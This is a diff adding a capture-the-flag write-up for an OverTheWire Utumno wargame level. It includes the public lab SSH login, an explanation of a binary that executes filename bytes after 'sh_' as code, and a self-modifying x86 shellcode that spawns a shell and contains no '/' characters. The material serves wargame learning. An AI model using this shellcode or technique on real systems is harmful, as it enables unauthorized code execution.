@@ -1,2 +1,31 @@
 ssh -p 2227 utumno1@utumno.labs.overthewire.org
 pass: aathaeyiew
+
+
+'''
+I don't feel like there's a heavy need to explain what this program does.
+If you have a fair bit of knowledge in x86 ASM, it's fairly simple.
+
+I'll go through it very briefly,
+First of all, it takes argv[1] and attempts to `opendir` it,
+if it fails, it simply exits.
+
+Afterwards, it calls `readdir` on it, once again, if it fails, it simply exits.
+Later on, it iterates over the dir entries, it compares the first three bytes of the filename (by the dirent struct) to equal "sh_".
+
+If it's equal, it moves on to the "custom" function named `run`.
+What this function does is treat the bytes of the filename after the "sh_" as x86 instructions and literally run them.
+
+According to that, we now know that we need a shellcode that could be used as a filename (must not contain null bytes or "/").
+Luckily, I found one online.
+
+I created a program that creates a file using raw bytes (our shellcode) and uploaded that to the remote machine.
+'''
+
+# Shellcode without "/"
+"\xeb\x33\x5e\x31\xc0\x88\x46\x07\x88\x46\x0a\x89\x76\x0b\x8d"
+"\x5e\x08\x89\x5e\x0f\x89\x46\x13\x8a\x06\xfe\xc0\xfe\xc0\x88"
+"\x06\x8a\x46\x04\xfe\xc0\xfe\xc0\x88\x46\x04\xb0\x0b\x89\xf3"
+"\x8d\x4e\x0b\x8d\x56\x13\xcd\x80\xe8\xc8\xff\xff\xff\x2d\x62"
+"\x69\x6e\x2d\x73\x68\x23\x2d\x69\x23\x41\x41\x41\x41\x42\x42"
+"\x42\x42\x43\x43\x43\x43";
